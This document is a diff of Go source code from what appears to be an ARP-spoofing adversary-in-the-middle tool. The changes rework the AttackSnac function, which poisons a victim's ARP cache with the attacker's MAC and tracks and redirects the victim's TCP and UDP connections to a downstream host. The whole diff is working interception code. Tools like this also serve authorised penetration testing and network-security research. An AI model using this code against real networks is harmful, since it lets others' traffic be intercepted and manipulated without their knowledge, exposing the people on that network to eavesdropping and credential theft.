@@ -23,7 +23,7 @@ var (
 //
 // - iName is the name of the network interface to sniff on.
 // - iAddr (optionally empty) specifies the ipv4 address
-//    on the interface to sniff for.
+//   on the interface to sniff for.
 // - When attackCh receives an AttackSnacCfg, a new background routine
 //   to perform an ARP spoofing attack is started.
 func MainSniff(ctx context.Context, cfg Cfg, attackCh chan AttackSnacCfg) (err error) {
@@ -89,7 +89,7 @@ func MainSniff(ctx context.Context, cfg Cfg, attackCh chan AttackSnacCfg) (err e
 							if downstream == nil {
 								downstream = cfg.aitm.getDefaultDS()
 							}
-							err := AttackSnac(ctx, cfg, args.SenderIp, args.TargetIp, downstream, args.Handlers...)
+							err := AttackSnac(ctx, &cfg, args.SenderIp, args.TargetIp, downstream, args.Handlers...)
 							if err != nil { // error while performing attack
 								fields = append(fields, zap.Error(err))
 								cfg.log.Error("error while poisoning conversation", fields...)
@@ -301,6 +301,11 @@ func attackSnacBpf(sIp, tIp string) string {
 	return fmt.Sprintf("src host %s || dst host %s", sIp, tIp)
 }
 
+const (
+	TCPProtoNumber uint8 = 0x06
+	UDPProtoNumber uint8 = 0x11
+)
+
 // AttackSnac poisons the sender's ARP table by sending our MAC address
 // when a request for the target's IP is observed. After poisoning
 // occurs and non-ARP traffic is detected, each packet is passed to
@@ -308,7 +313,7 @@ func attackSnacBpf(sIp, tIp string) string {
 //
 // NOTE: Before poisoning the sender's ARP table, this function passively
 // waits for the sender to broadcast an ARP request.
-func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downstream *misc.ConntrackInfo,
+func AttackSnac(ctx context.Context, cfg *Cfg, senIp net.IP, tarIp net.IP, downstream *misc.ConntrackInfo,
   handlers ...ArpSpoofHandler) (err error) {
 
 	logFields := []zap.Field{zap.String("senderIp", senIp.String()), zap.String("targetIp", tarIp.String())}
@@ -331,20 +336,6 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downst
 	}
 	defer nfct.Close()
 
-	// TODO this should probably filter for TCP SYN or something
-	filter := []conntrack.ConnAttr{
-		{
-			Type: conntrack.AttrOrigIPv4Src,
-			Data: senIp.To4(),
-			Mask: []byte{0xff, 0xff, 0xff, 0xff},
-		},
-		{
-			Type: conntrack.AttrOrigIPv4Dst,
-			Data: tarIp.To4(),
-			Mask: []byte{0xff, 0xff, 0xff, 0xff},
-		},
-	}
-
 	// ensure a downstream is available for the connection
 	var downstreamDefault bool
 	if downstream == nil {
@@ -357,34 +348,47 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downst
 		}
 	}
 
-	err = nfct.RegisterFiltered(ctx, conntrack.Conntrack, conntrack.NetlinkCtNew, filter, func(con conntrack.Con) int {
-		if con.ProtoInfo == nil || con.ProtoInfo.TCP == nil {
-			return 0
-		}
-		k := misc.ConntrackInfo{Addr: misc.Addr{
-			IP:   con.Origin.Src.To4().String(),
-			Port: fmt.Sprintf("%d", *con.Origin.Proto.SrcPort)},
-			Transport: misc.TCPConntrackTransport,
-		}
-		if _, ok := cfg.aitm.connAddrs.Load(k); !ok {
-			var v misc.ConntrackInfo
-			if downstreamDefault {
-				// downstream should just hit the default tcp server
-				// NOTE that the port is changed in this case, where it's
-				// preserved when a real downstream is supplied
-				v = *downstream
-			} else {
-				// downstream should target a real host on the target port
-				v = misc.ConntrackInfo{Addr: misc.Addr{
-					IP:   downstream.IP,
-					Port: fmt.Sprintf("%d", *con.Origin.Proto.DstPort)},
-					Transport: misc.TCPConntrackTransport,
-				}
-			}
-			cfg.aitm.connAddrs.Store(k, v)
-		}
-		return 0
-	})
+	// TODO we should probably throw an error if the downstream is already set
+	cfg.aitm.downstreams.Store(senIp.To4().String(), downstream)
+
+	// filter conntrack on ip and dst source
+	filter := []conntrack.ConnAttr{
+		// Source IP address (sender)
+		{
+			Type: conntrack.AttrOrigIPv4Src,
+			Data: senIp.To4(),
+			Mask: []byte{0xff, 0xff, 0xff, 0xff},
+		},
+		// Destination IP address (target -- poisoned cache record btw)
+		{
+			Type: conntrack.AttrOrigIPv4Dst,
+			Data: tarIp.To4(),
+			Mask: []byte{0xff, 0xff, 0xff, 0xff},
+		},
+	}
+
+	//// track new connections
+	//err = nfct.RegisterFiltered(ctx, conntrack.Conntrack, conntrack.NetlinkCtNew, filter,
+	//	newConnFilterFunc(cfg, downstream, downstreamDefault))
+	//
+	//if err != nil {
+	//	err = fmt.Errorf("failed to register nfct connection filter: %w", err)
+	//	return
+	//}
+
+	// delete destroyed connections
+	// NOTE: Netfilter was found to be unreliable in terms of calling multiple
+	// hook functions at the right time. It would often call the "destroy" hook
+	// before "new", so the connection information would be lost before it reached
+	// the connection map. Leaving this here for posterity.
+
+	err = nfct.RegisterFiltered(ctx, conntrack.Conntrack, conntrack.NetlinkCtDestroy, filter,
+		destroyConnFilterFunc(cfg))
+
+	if err != nil {
+		err = fmt.Errorf("failed to register nfct destroyed connection filter: %w", err)
+		return
+	}
 
 	//========================
 	// POISON VICTIM ARP CACHE
@@ -418,10 +422,16 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downst
 	for {
 		select {
 		case <-ctx.Done():
+			cfg.aitm.downstreams.Delete(senIp.To4().String())
 			return
 		case packet := <-in:
 
 			if arp := GetArpLayer(packet); arp != nil && arp.Operation == layers.ARPRequest {
+
+				//==================================
+				// POISON ARP CACHE OF TARGET SENDER
+				//==================================
+
 				cfg.log.Debug("poisoning sender arp table", logFields...)
 				// Respond with our MAC
 				cfg.arp.ch <- SendArpCfg{
@@ -433,6 +443,41 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downst
 					TargetIp:  arp.SourceProtAddress,
 				}
 				continue
+
+			} else if ipL, ok := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4); ok {
+
+				//==============================================
+				// HANDLE INCOMING TCP CONNECTIONS & UDP PACKETS
+				//==============================================
+
+				k := misc.ConntrackInfo{Addr: misc.Addr{IP: ipL.SrcIP.To4().String()}}
+				v := *downstream
+
+				if tcp, ok := packet.Layer(layers.LayerTypeTCP).(*layers.TCP); ok && tcp.SYN {
+					k.Port = tcp.SrcPort.String()
+					k.Transport = misc.TCPConntrackTransport
+					if !downstreamDefault {
+						v.Port = tcp.DstPort.String()
+						v.Transport = misc.TCPConntrackTransport
+					}
+				} else if udp, ok := packet.Layer(layers.LayerTypeUDP).(*layers.UDP); ok {
+					// TODO we should probably look into refining this
+					//  one of the benefits of conntrack is that it could infer the state
+					//  of a UDP "connection"....
+					k.Port = udp.SrcPort.String()
+					k.Transport = misc.UDPConntrackTransport
+					if !downstreamDefault {
+						v.Port = udp.DstPort.String()
+						v.Transport = misc.UDPConntrackTransport
+					}
+				}
+
+				if k.Port == "" {
+					// Didn't find TCP or UDP layer.....NOP
+				} else if _, ok = cfg.aitm.connAddrs.Load(k); !ok {
+					// Store unique connection
+					cfg.aitm.connAddrs.Store(k, v)
+				}
 			}
 
 			// Run handlers
@@ -444,5 +489,77 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downst
 				}
 			}()
 		}
+	}
+}
+
+// newConnFilterFunc returns a conntrack.HookFunc for handling incoming
+// UDP and TCP connections.
+func newConnFilterFunc(cfg *Cfg, downstream *misc.ConntrackInfo, downstreamDefault bool) conntrack.HookFunc {
+	return func(con conntrack.Con) int {
+
+		// dereferencing this pointer may seem reckless, but it's fine
+		// because the filter only accepts tcp/udp traffic
+		t := misc.ConntrackTransportFromProtoNum(*con.Origin.Proto.Number)
+		if t == "" {
+			cfg.log.Warn("transport proto num miss")
+			return 0
+		}
+
+		// build the key used to track the connection
+		k := misc.ConntrackInfo{Addr: misc.Addr{
+			IP:   con.Origin.Src.To4().String(),
+			Port: fmt.Sprintf("%d", *con.Origin.Proto.SrcPort)},
+			Transport: t,
+		}
+
+		// store a new connection
+		if _, ok := cfg.aitm.connAddrs.Load(k); !ok {
+			var v misc.ConntrackInfo
+			if downstreamDefault {
+				// downstream should just hit the default tcp/udp server
+				// NOTE that the port is changed in this case, where it's
+				// preserved when a real downstream is supplied
+
+				// copy the default downstream
+				v = *downstream
+				// set to the proper transport protocol
+				v.Transport = t
+			} else {
+				// downstream should target a real host on the target port
+				v = misc.ConntrackInfo{Addr: misc.Addr{
+					IP:   downstream.IP,
+					Port: fmt.Sprintf("%d", *con.Origin.Proto.DstPort)},
+					Transport: t,
+				}
+			}
+			// store the connection
+			cfg.aitm.connAddrs.Store(k, v)
+		}
+
+		return 0
+	}
+}
+
+// newConnFilterFunc returns a conntrack.HookFunc for cleaning up destroyed
+// UDP and TCP connections.
+//
+func destroyConnFilterFunc(cfg *Cfg) conntrack.HookFunc {
+	return func(con conntrack.Con) int {
+		// dereferencing this pointer may seem reckless, but it's fine
+		// because the filter only accepts tcp/udp traffic
+		t := misc.ConntrackTransportFromProtoNum(*con.Origin.Proto.Number)
+		if t == "" {
+			return 0
+		}
+		k := misc.ConntrackInfo{Addr: misc.Addr{
+			IP:   con.Origin.Src.To4().String(),
+			Port: fmt.Sprintf("%d", *con.Origin.Proto.SrcPort)},
+			Transport: t,
+		}
+		if _, ok := cfg.aitm.connAddrs.Load(k); ok {
+			cfg.aitm.connAddrs.Delete(k)
+		}
+		cfg.log.Debug("cleaning destroyed connection", zap.Any("source", k))
+		return 0
 	}
 }
